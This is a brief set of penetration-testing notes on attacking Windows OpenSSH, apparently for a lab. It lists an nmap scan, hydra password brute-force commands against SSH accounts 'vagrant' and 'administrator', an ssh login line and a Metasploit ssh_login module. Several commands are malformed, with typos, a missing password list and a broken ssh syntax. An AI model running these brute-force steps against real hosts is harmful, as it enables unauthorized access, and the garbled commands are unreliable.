---
title: Windows OpenSSH
description: Notes on Windows OpenSSH.
date: '2026-10-26'
topics:
  - systems
section:
  - Systems
  - Window
order: 105
---
```
nmap -Pn -ss -sVC IP_ADDRESS
```



```
hydra -l vagrant -P   IP_AADRESS ssh
```


```
hydra -l administrator -P   IP_AADRESS ssh
```


```bash
ssh@vagrant@IP_ADDRESS
```



## With metasploit

SSH Exploit

```
use auxiliary/scanner/ssh/ssh_login
```
